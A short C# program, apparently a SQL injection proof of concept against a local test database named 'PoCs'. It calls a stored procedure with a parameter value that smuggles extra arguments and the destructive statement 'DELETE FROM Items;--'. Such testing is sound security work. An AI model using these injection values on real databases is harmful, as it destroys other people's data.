using System;
using System.Data;
using Microsoft.Data.SqlClient;

class Program
{
    static void Main()
    {
   
        var connectionString =
            "Data Source=localhost,1433;Initial Catalog=PoCs;Integrated Security=True;TrustServerCertificate=True";

       try
        {
            using var conn = new SqlConnection(connectionString);
            conn.Open();

            using var cmd = new SqlCommand("dbo.procedimientoY", conn);
            cmd.CommandType = CommandType.StoredProcedure;

            cmd.Parameters.Add(new SqlParameter("@p_Telefono",SqlDbType.VarChar, 500) { Value = "'Telefono',@p_Pais='pais',@p_FechaRegistro='2025-10-21',@p_Comentario='October3'; DELETE FROM Items;--" });

            int afectados = cmd.ExecuteNonQuery();
            Console.WriteLine($"Filas afectadas: {afectados}");
        }
        catch
        {
            Console.WriteLine("Olvidaste - 3/10 - Alchemist");
        }


    }
}
